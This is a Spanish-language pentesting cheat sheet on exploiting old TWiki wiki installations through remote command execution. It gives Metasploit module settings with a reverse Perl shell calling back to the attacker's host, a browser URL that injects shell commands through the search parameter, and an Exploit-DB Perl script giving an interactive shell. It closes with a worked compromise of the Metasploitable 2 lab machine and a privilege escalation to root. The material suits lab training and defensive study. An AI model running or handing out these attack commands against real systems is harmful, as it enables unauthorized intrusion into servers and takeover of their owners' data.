# TWiki

## Descripción

TWiki es una **plataforma wiki empresarial** de código abierto basada en Perl y CGI. Las versiones antiguas (anteriores a 2004) tienen vulnerabilidades críticas de **ejecución remota de comandos (RCE)** que permiten ejecutar comandos del sistema operativo sin autenticación.

**Puerto por defecto:** 80 (HTTP) / 443 (HTTPS)
**Ruta típica:** `/twiki`
**Tecnología:** Perl + CGI

---

## Identificación

La versión aparece en el **pie de página** de cualquier página:

```
Revision r1.X - DD Mon YYYY - HH:MM GMT - AutorNombre
Copyright © 1999-XXXX by the contributing authors.
```

La fecha del copyright indica la época de la versión instalada. También se puede navegar a:

```
http://TARGET/twiki/bin/view/TWiki/WebHome
```

---

## Vulnerabilidades conocidas

### RCE via parámetro rev — twiki_history (CVE relacionado)

**Referencia:** Exploit-DB 16892.rb
**Versiones afectadas:** TWiki antiguas (~2003)

Explota el parámetro `rev` del módulo de historial para ejecutar comandos arbitrarios.

**Módulo de Metasploit:**

```shell
use exploit/unix/webapp/twiki_history
set RHOSTS TARGET_IP
set LHOST KALI_IP
set LPORT 8888
set URI /twiki/bin
set PAYLOAD cmd/unix/reverse_perl
jobs -K
run
```

---

### RCE via función search — twiki_search (CVE-2004-1037)

**Referencia:** Exploit-DB 16894.rb
**Versiones afectadas:** TWiki antiguas

Explota la función de búsqueda pasando metacaracteres de shell en el parámetro `search`.

**Módulo de Metasploit:**

```shell
use exploit/unix/webapp/twiki_search
set RHOSTS TARGET_IP
set LHOST KALI_IP
set LPORT 8888
set URI /twiki/bin
set PAYLOAD cmd/unix/reverse_perl
run
```

**Verificación manual** — intentar RCE con el navegador:

```
http://TARGET/twiki/bin/search/Main?search=`id`&scope=text&regex=on
```

Si devuelve el resultado de `id` en la página, hay RCE directo.

---

### RCE via search.pm (TWiki 20030201)

**Referencia:** Exploit-DB 642.pl
**Versiones afectadas:** TWiki 20030201

Script Perl que proporciona una pseudo-shell interactiva. No requiere reverse shell.

```shell
perl /usr/share/exploitdb/exploits/cgi/webapps/642.pl \
  --host=TARGET_IP \
  --path=/twiki/bin/search/Main \
  --post
```

---

## Rutas útiles

| Ruta | Descripción |
|------|-------------|
| `/twiki/bin/view/Main/WebHome` | Página principal |
| `/twiki/bin/view/TWiki/WebHome` | Info de la instalación |
| `/twiki/bin/search/Main/` | Motor de búsqueda vulnerable |
| `/twiki/bin/view/Main/WebSearch` | Búsqueda avanzada |
| `/twiki/bin/view/Main/TWikiUsers` | Lista de usuarios |

---

## Notas importantes

- El módulo `twiki_history` es más fiable que `twiki_search` en instalaciones antiguas.
- Si aparece `Handler failed to bind`, ejecutar `jobs -K` en msfconsole antes de relanzar.
- La shell obtenida es como `www-data`, necesitarás escalar privilegios para obtener root.
- Cambiar el LPORT si hay problemas de binding — puertos como 4444 o 5555 suelen estar ocupados por sesiones anteriores.

---

## Ejemplo real — Máquina Metasploitable 2

TWiki versión ~2003 encontrada en `/twiki`. Explotada con el módulo `twiki_history` de Metasploit obteniendo shell como `www-data`:

```
[*] Command shell session 1 opened (192.168.56.102:8888 -> 192.168.56.101:59355)
```

Desde esa shell escalamos privilegios a root via udev CVE-2009-1185.
